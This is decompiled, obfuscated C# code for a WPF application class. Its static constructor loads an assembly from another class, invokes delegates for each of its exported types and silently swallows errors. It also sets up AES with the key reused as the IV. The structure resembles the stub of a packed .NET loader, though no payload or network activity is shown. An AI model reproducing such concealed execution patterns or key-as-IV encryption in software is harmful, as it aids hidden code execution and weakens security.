using System;
using System.Collections.Generic;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Windows;
using System.Windows.Interop;
using System.Windows.Threading;
using ns4;
using ns5;

namespace ns1;

public class GClass0 : Application
{
	internal delegate void Delegate0();

	private static readonly int h;

	internal static bool smethod_0(Aes aes_0, byte[] byte_0, out byte[] byte_1)
	{
		if (aes_0 == null)
		{
			byte_1 = new byte[0];
			return true;
		}
		smethod_1(aes_0, byte_0);
		byte_1 = new byte[0];
		return false;
	}

	internal static void smethod_1(Aes aes_0, byte[] byte_0)
	{
		aes_0.KeySize = 128;
		aes_0.BlockSize = 128;
		aes_0.Padding = PaddingMode.Zeros;
		aes_0.Key = byte_0;
		aes_0.IV = byte_0;
	}

	static GClass0()
	{
		try
		{
			foreach (Type item in smethod_2())
			{
				GClass1.smethod_0(item, out var delegate_);
				((Delegate0)delegate_)();
			}
		}
		catch
		{
		}
	}

	internal static IEnumerable<Type> smethod_2()
	{
		return smethod_5().ExportedTypes;
	}

	public static void Main()
	{
		try
		{
			new GClass0().method_0();
		}
		catch
		{
		}
	}

	public int method_0()
	{
		return smethod_3(null);
	}

	internal static int smethod_3(Window window_0)
	{
		if (!BrowserInteropHelper.get_IsBrowserHosted())
		{
			smethod_4(null);
		}
		return h;
	}

	private static object smethod_4(object object_0)
	{
		Dispatcher.Run();
		return null;
	}

	[CompilerGenerated]
	internal static Assembly smethod_5()
	{
		return GClass2.smethod_0();
	}
}
